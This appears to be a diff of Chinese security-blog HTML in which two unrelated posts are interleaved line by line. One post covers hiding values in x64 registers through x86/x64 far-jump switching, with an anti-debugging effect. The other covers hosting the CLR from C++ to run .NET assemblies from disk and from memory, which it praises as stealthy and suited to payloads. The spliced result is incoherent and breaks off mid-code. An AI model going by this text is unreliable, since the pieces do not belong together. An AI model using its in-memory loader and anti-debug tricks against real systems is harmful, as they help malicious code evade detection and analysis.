-<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="x64部分"><a href="#x64部分" class="headerlink" title="x64部分"></a>x64部分</h2><p>首先我们实现读寄存器的代码，我们的思路就是将我们要保存的值写入<code>r12</code>寄存器，那么读寄存器就是将寄存器的值取出，这里用到<code>mov qword ptr ds:[0], r12</code>取出</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171143684.png" alt="image-20220417171143684"></p>
-<p>这里看一下硬编码是<code>4C:892425</code>，这里一般都不使用<code>2425</code>，如果使用<code>2425</code>会导致寻址比较麻烦</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171157693.png" alt="image-20220417171157693"></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171216564.png" alt="image-20220417171216564"></p>
-<p>这里直接使用<code>25</code>指令，可以看到<code>ds</code>里面的地址已经变成了<code>7FFED53D11AE</code>，这里跳转的地址先不管，假设我们已经拿到了寄存器的值</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171250573.png" alt="image-20220417171250573"></p>
-<p>那么这里就要进行x64返回x86的操作，windows并没有提供直接返回x86的指令，如果使用<code>jmp 0023</code>会报错</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417191548783.png" alt="image-20220417191548783"></p>
-<p>那么这里我们就可以选择将跳转地址存到<code>rax</code>里面，再通过<code>jmp far</code>指令跳转回x86</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171447568.png" alt="image-20220417171447568"></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171533505.png" alt="image-20220417171533505"></p>
-<p>总体的汇编指令如下</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417172649913.png" alt="image-20220417172649913"></p>
-<p>这里把硬编码抠出来如下所示，这里地址先不管，我们放在后面补充</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">	__emit <span class="number">0x4c</span>		<span class="comment">//mov qword ptr ds:[0], r12</span></span><br><span class="line">	__emit <span class="number">0x89</span></span><br><span class="line">	__emit <span class="number">0x25</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">	__emit <span class="number">0x00</span>		</span><br><span class="line"></span><br><span class="line">	__emit <span class="number">0xb8</span>		<span class="comment">// mov eax, 0</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">	__emit <span class="number">0x48</span>		<span class="comment">//jmp far tword ptr ds:[rax]</span></span><br><span class="line">	__emit <span class="number">0xff</span></span><br><span class="line">	__emit <span class="number">0x28</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再就是<code>Unmanaged API</code>，它其实是一套能将<code>.net</code>程序集加载到任意程序里面的<code>API</code>，它支持<code>ICorRuntimeHost Interface</code>和<code>ICLRRuntimeHost Interface</code>两种接口，我们看一下msdn里面的描述</p>
+<p><img src="/images/ETW/image-20220512153622148.png" alt="image-20220512153622148"></p>
+<p>其中<code>ICorRuntimeHost Interface</code>支持的版本有<code>v1.0.3705</code>, <code>v1.1.4322</code>, <code>v2.0.50727</code>，<code>v4.0.30319</code>，<code>ICLRRuntimeHost Interface</code>支持的版本有<code>v2.0.50727</code>,<code>v4.0.30319</code>，在实际的开发里面两种接口都是可以使用的</p>
+<p>cs实现在非托管程序中加载主要是调用了<code>ICLRRuntimeHost </code>的接口，主要用到以下3个接口</p>
+<blockquote>
+<p>ICLRMetaHost </p>
+<p>ICLRRuntimeInfo </p>
+<p>ICLRRuntimeHost </p>
+</blockquote>
+<p><code>ICLRMetaHost </code>提供基于版本号返回特定版本的公共语言运行时 (CLR)、列出所有已安装的 CLR、列出在指定进程中加载的所有运行时、发现用于编译程序集的 CLR 版本、退出进程的方法干净的运行时关闭，并查询旧版 API 绑定</p>
+<p><img src="/images/ETW/image-20220512154845367.png" alt="image-20220512154845367"></p>
+<p><code>ICLRRuntimeInfo</code>提供一些方法，这些方法可返回有关特定公共语言运行时 (CLR) 的信息，包括版本、目录和加载状态。 此接口还提供了特定于运行时的功能，而无需初始化运行时。 它包括运行时相对 LoadLibrary 方法、运行时模块特定的 GetProcAddress 方法和通过 GetInterface 方法提供的运行时提供的接口</p>
+<p><img src="/images/ETW/image-20220512154925602.png" alt="image-20220512154925602"></p>
+<p><code>ICLRRuntimeHost</code>提供与 .NET Framework 版本1中提供的 <code>ICorRuntimeHost </code>接口类似的功能，其中包含以下更改： 用于设置宿主控件接口的 <code>SetHostControl </code>方法的添加，省略提供的某些方法 <code>ICorRuntimeHost</code></p>
+<p><img src="/images/ETW/image-20220512155157965.png" alt="image-20220512155157965"></p>
+<h2 id="硬盘加载"><a href="#硬盘加载" class="headerlink" title="硬盘加载"></a>硬盘加载</h2><p>首先这里我们写一个<code>Printf</code>函数，使用<code>Console.WriteLine</code>接收</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> etw1</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">Main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">Printf</span><span class="params">(String strings)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            Console.<span class="built_in">WriteLine</span>(strings);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>再就是写入数据的函数，我们将数据存放到<code>r12</code>寄存器里面，使用<code>mov r12, 0x12345678</code></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417172719482.png" alt="image-20220417172719482"></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417172831624.png" alt="image-20220417172831624"></p>
-<p>然后还是跟上面一样将返回地址压入rax寄存器，通过<code>jmp far</code>指令返回x86</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417172854758.png" alt="image-20220417172854758"></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417172918414.png" alt="image-20220417172918414"></p>
-<p>总体的汇编代码如下</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417173003616.png" alt="image-20220417173003616"></p>
-<p>将硬编码抠出来写成<code>go_write</code>函数</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">	<span class="comment">//__emit 0xcc</span></span><br><span class="line">	__emit <span class="number">0x49</span>		<span class="comment">//mov r12, 0x12345678</span></span><br><span class="line">	__emit <span class="number">0xc7</span></span><br><span class="line">	__emit <span class="number">0xc4</span></span><br><span class="line">	__emit <span class="number">0x78</span></span><br><span class="line">	__emit <span class="number">0x56</span></span><br><span class="line">	__emit <span class="number">0x34</span></span><br><span class="line">	__emit <span class="number">0x12</span></span><br><span class="line"></span><br><span class="line">	__emit <span class="number">0xb8</span>		<span class="comment">// mov eax, 403018h</span></span><br><span class="line">	__emit <span class="number">0x18</span></span><br><span class="line">	__emit <span class="number">0x30</span></span><br><span class="line">	__emit <span class="number">0x40</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">	__emit <span class="number">0x48</span>		<span class="comment">//jmp far tword ptr ds:[rax]</span></span><br><span class="line">	__emit <span class="number">0xff</span></span><br><span class="line">	__emit <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在服务端我们首先使用<code>CLRCreateInstance</code>初始化<code>ICLRMetaHost</code>接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&amp;iMetaHost);</span><br></pre></td></tr></table></figure>
 
 
 
-<p>我们在上面已经实现了<code>go_read</code>和<code>go_write</code>函数，那么这里我们首先将这两个函数的地址打印出来</p>
-<pre><code>printf(&quot;go_read: %p\n&quot;, go_read);
-printf(&quot;go_write: %p\n&quot;, go_write);
-</code></pre>
-<p>注意这里需要将随机基址关闭，否则每次生成的地址都会不相同</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417185839002.png" alt="image-20220417185839002"></p>
-<p>这里得到<code>go_read</code>的地址为<code>401000</code>，<code>go_write</code>的地址为<code>401020</code></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417185148937.png" alt="image-20220417185148937"></p>
-<h2 id="x86部分"><a href="#x86部分" class="headerlink" title="x86部分"></a>x86部分</h2><p>我们去到x32dbg，在上面我们已经分析了x86程序在64位系统里面会首先从x86转换成x64再通过<code>syscall</code>进入0环，那么这里同样的我们需要自己构造汇编语句</p>
-<p>这里如果直接使用<code>jmp far 33:0x00401000</code>会报错，这里是因为函数的地址不对</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417190120093.png" alt="image-20220417190120093"></p>
-<p>我们去看一下系统汇编的实现，是通过<code>EA</code>/<code>3300</code>这两个硬编码实现</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417190135929.png" alt="image-20220417190135929"></p>
-<p>那么这里我们通过ctrl+e修改十六进制文件</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417190152890.png" alt="image-20220417190152890"></p>
-<p>即可构造出跳转到<code>go_write</code>函数地址的语句</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417190521283.png" alt="image-20220417190521283"></p>
-<p>将硬编码抠出来如下</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">	__emit <span class="number">0xea</span></span><br><span class="line">	__emit <span class="number">0x20</span></span><br><span class="line">	__emit <span class="number">0x10</span></span><br><span class="line">	__emit <span class="number">0x40</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">	__emit <span class="number">0x33</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后调用<code>GetRuntime</code>方法获取<code>ICLRRuntimeInfo</code>接口</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iMetaHost-&gt;<span class="built_in">GetRuntime</span>(<span class="string">L&quot;v4.0.30319&quot;</span>, IID_ICLRRuntimeInfo, (LPVOID*)&amp;iRuntimeInfo);</span><br></pre></td></tr></table></figure>
 
 
 
-<p>构造跳转到<code>go_read</code>语句同理</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417190551281.png" alt="image-20220417190551281"></p>
-<p>将硬编码抠出来如下</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">	__emit <span class="number">0xea</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">	__emit <span class="number">0x10</span></span><br><span class="line">	__emit <span class="number">0x40</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">	__emit <span class="number">0x33</span></span><br><span class="line">	__emit <span class="number">0x00</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再使用<code>ICLRRuntimeInfo</code>将 <code>CLR </code>加载到当前进程，返回运行时接口<code>ICLRRuntimeHost</code>指针</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iRuntimeInfo-&gt;<span class="built_in">GetInterface</span>(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&amp;iRuntimeHost);</span><br></pre></td></tr></table></figure>
 
 
 
-<p>这里我们再定义两个数组，<code>far_jmp</code>数组存放的值即为x64返回x86要跳转的函数地址，<code>secret</code>数组用来存放从<code>r12</code>取出来的值</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> far_jmp[<span class="number">10</span>] = &#123; <span class="number">0x78</span>, <span class="number">0x10</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span> &#125;;<span class="comment">//403018</span></span><br><span class="line"><span class="keyword">char</span> secret[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">//403388</span></span><br></pre></td></tr></table></figure>
+<p>然后再通过<code>ICLRRuntimeHost.EecuteInDefaultAppDomain</code>执行指定程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iRuntimeHost-&gt;ExecuteInDefaultAppDomain</span><br><span class="line">(L&quot;F:\\C#\\etw1\\bin\\Debug\\etw1.exe&quot;, L&quot;etw1.Program&quot;, L&quot;Printf&quot;, L&quot;etw1&quot;, NULL);</span><br></pre></td></tr></table></figure>
 
 
 
-<p><code>far_jmp</code>的地址为<code>00403018</code>，<code>secret</code>的地址为<code>00403388</code></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417193910062.png" alt="image-20220417193910062"></p>
-<p>通过计算可以将<code>go_read</code>里面的地址填充上去，将<code>r12</code>寄存器的值存入<code>secret</code>数组</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __declspec(naked) <span class="built_in">go_read</span>() </span><br><span class="line">&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		__emit <span class="number">0x4c</span>		<span class="comment">//mov qword ptr ds:[0x403388], r12</span></span><br><span class="line">		__emit <span class="number">0x89</span></span><br><span class="line">		__emit <span class="number">0x25</span></span><br><span class="line">		__emit <span class="number">0x7A</span></span><br><span class="line">		__emit <span class="number">0x23</span></span><br><span class="line">		__emit <span class="number">0x00</span></span><br><span class="line">		__emit <span class="number">0x00</span>		</span><br><span class="line"></span><br><span class="line">		__emit <span class="number">0xb8</span>		<span class="comment">// mov eax, 403018h</span></span><br><span class="line">		__emit <span class="number">0x18</span></span><br><span class="line">		__emit <span class="number">0x30</span></span><br><span class="line">		__emit <span class="number">0x40</span></span><br><span class="line">		__emit <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">		__emit <span class="number">0x48</span>		<span class="comment">//jmp far tword ptr ds:[rax]</span></span><br><span class="line">		__emit <span class="number">0xff</span></span><br><span class="line">		__emit <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实现效果如下</p>
+<p><img src="/images/ETW/image-20220512182344215.png" alt="image-20220512182344215"></p>
+<h2 id="内存加载"><a href="#内存加载" class="headerlink" title="内存加载"></a>内存加载</h2><p>内存加载相对于硬盘加载，首先是整个过程都会在内存执行而不会写入文件，隐蔽性较好，而且最终的payload为c#程序，调用powershell十分方便利用</p>
+<p>那么我们来进行代码的实现，首先还是初始化<code>CLR</code>环境</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CLRCreateInstance</span>(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&amp;iMetaHost);</span><br><span class="line">iMetaHost-&gt;<span class="built_in">GetRuntime</span>(<span class="string">L&quot;v4.0.30319&quot;</span>, IID_ICLRRuntimeInfo, (VOID**)&amp;iRuntimeInfo);</span><br><span class="line">iRuntimeInfo-&gt;<span class="built_in">GetInterface</span>(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&amp;iRuntimeHost);</span><br><span class="line">iRuntimeHost-&gt;<span class="built_in">Start</span>();</span><br></pre></td></tr></table></figure>
 
 
 
-<p><code>go_write</code>函数同样填充<code>403018</code>这个地址即可</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __declspec(naked) <span class="built_in">go_write</span>()</span><br><span class="line">&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		<span class="comment">//__emit 0xcc</span></span><br><span class="line">		__emit <span class="number">0x49</span>		<span class="comment">//mov r12, 0x12345678</span></span><br><span class="line">		__emit <span class="number">0xc7</span></span><br><span class="line">		__emit <span class="number">0xc4</span></span><br><span class="line">		__emit <span class="number">0x78</span></span><br><span class="line">		__emit <span class="number">0x56</span></span><br><span class="line">		__emit <span class="number">0x34</span></span><br><span class="line">		__emit <span class="number">0x12</span></span><br><span class="line"></span><br><span class="line">		__emit <span class="number">0xb8</span>		<span class="comment">// mov eax, 403018h</span></span><br><span class="line">		__emit <span class="number">0x18</span></span><br><span class="line">		__emit <span class="number">0x30</span></span><br><span class="line">		__emit <span class="number">0x40</span></span><br><span class="line">		__emit <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">		__emit <span class="number">0x48</span>		<span class="comment">//jmp far tword ptr ds:[rax]</span></span><br><span class="line">		__emit <span class="number">0xff</span></span><br><span class="line">		__emit <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后使用<code>ICLRRuntimeHost</code>获取<code>AppDomain</code>接口指针，然后通过<code>AppDomain</code>接口的<code>QueryInterface</code>方法来查询默认应用程序域的实例指针</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iRuntimeHost-&gt;GetDefaultDomain(&amp;pAppDomain);</span><br><span class="line">pAppDomain-&gt;QueryInterface(__uuidof(_AppDomain), (VOID**)&amp;pDefaultAppDomain);</span><br></pre></td></tr></table></figure>
 
 
 
-<p>然后这里首先进入x64模式调用<code>go_write</code>函数，设置一个断点，再调用<code>go_read</code>读取寄存器里面的值并打印</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">	*(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)far_jmp = <span class="number">0x00401064</span>;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		__emit <span class="number">0xea</span></span><br><span class="line">		__emit <span class="number">0x20</span></span><br><span class="line">		__emit <span class="number">0x10</span></span><br><span class="line">		__emit <span class="number">0x40</span></span><br><span class="line">		__emit <span class="number">0x00</span></span><br><span class="line">		__emit <span class="number">0x33</span></span><br><span class="line">		__emit <span class="number">0x00</span></span><br><span class="line">	&#125;</span><br><span class="line">L1:<span class="comment">//00401064</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;write data ok\n&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	*(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)far_jmp = <span class="number">0x0040108c</span>;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		__emit <span class="number">0xea</span></span><br><span class="line">		__emit <span class="number">0x00</span></span><br><span class="line">		__emit <span class="number">0x10</span></span><br><span class="line">		__emit <span class="number">0x40</span></span><br><span class="line">		__emit <span class="number">0x00</span></span><br><span class="line">		__emit <span class="number">0x33</span></span><br><span class="line">		__emit <span class="number">0x00</span></span><br><span class="line">	&#125;</span><br><span class="line">L2: <span class="comment">//0040108c</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;back to x86\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, *(<span class="keyword">int</span>*)secret);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ETW/image-20220512195501155.png" alt="image-20220512195501155"></p>
+<p>使用<code>Load_3(…)</code>从内存中读取并加载<code>.NET</code>程序集</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">saBound[<span class="number">0</span>].cElements = ASSEMBLY_LENGTH;</span><br><span class="line">saBound[<span class="number">0</span>].lLbound = <span class="number">0</span>;</span><br><span class="line">SAFEARRAY* pSafeArray = <span class="built_in">SafeArrayCreate</span>(VT_UI1, <span class="number">1</span>, saBound);</span><br><span class="line"></span><br><span class="line"><span class="built_in">SafeArrayAccessData</span>(pSafeArray, &amp;pData);</span><br><span class="line"><span class="built_in">memcpy</span>(pData, dotnetRaw, ASSEMBLY_LENGTH);</span><br><span class="line"><span class="built_in">SafeArrayUnaccessData</span>(pSafeArray);</span><br><span class="line"></span><br><span class="line">pDefaultAppDomain-&gt;<span class="built_in">Load_3</span>(pSafeArray, &amp;pAssembly);</span><br><span class="line">pAssembly-&gt;<span class="built_in">get_EntryPoint</span>(&amp;pMethodInfo);</span><br></pre></td></tr></table></figure>
 
 
 
-<h1 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h1><h2 id="数据隐藏"><a href="#数据隐藏" class="headerlink" title="数据隐藏"></a>数据隐藏</h2><p>这里我们首先运行程序</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417204508726.png" alt="image-20220417204508726"></p>
-<p>打开ce搜索字符串，这里是没有显示的</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417204736641.png" alt="image-20220417204736641"></p>
-<p>这里再继续向下执行可以看到这里返回了x86并将<code>12345678</code>写入到了内存，所以在ce里面能够看到</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417204821422.png" alt="image-20220417204821422"></p>
-<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>这里首先运行程序，可以看到存放字符串的数组地址<code>0040337C</code>是空白的</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417205853777.png" alt="image-20220417205853777"></p>
-<p>然后这里继续运行，可以看到存放字符的地址已经有了值</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417205905916.png" alt="image-20220417205905916"></p>
-<p>那么这里我们如果要调试程序一般会在存放字符串的地址添加一个硬件写入断点</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417210113692.png" alt="image-20220417210113692"></p>
-<p>这里当我们通过硬件断点断在了<code>771F2AAC</code>的<code>ret 4</code>，这里可以看到是在<code>ZwClose</code>里面，这里明显是通过异常处理函数来到了<code>771F2AAC</code>这个位置，虽然这里<code>0x0040337C</code>这个位置写入了数值，但是这里程序的eip已经不能够继续跟下去了，起到了反调试的效果</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417210229225.png" alt="image-20220417210229225"></p>
+<p>创建安全数组并执行入口点</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ZeroMemory</span>(&amp;vRet, <span class="built_in"><span class="keyword">sizeof</span></span>(VARIANT));</span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;vObj, <span class="built_in"><span class="keyword">sizeof</span></span>(VARIANT));</span><br><span class="line">vObj.vt = VT_NULL;</span><br><span class="line"></span><br><span class="line">vPsa.vt = (VT_ARRAY | VT_BSTR);</span><br><span class="line">args = <span class="built_in">SafeArrayCreateVector</span>(VT_VARIANT, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	vPsa.parray = <span class="built_in">SafeArrayCreateVector</span>(VT_BSTR, <span class="number">0</span>, argc);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">SafeArrayPutElement</span>(vPsa.parray, &amp;i, <span class="built_in">SysAllocString</span>(argv[i]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span 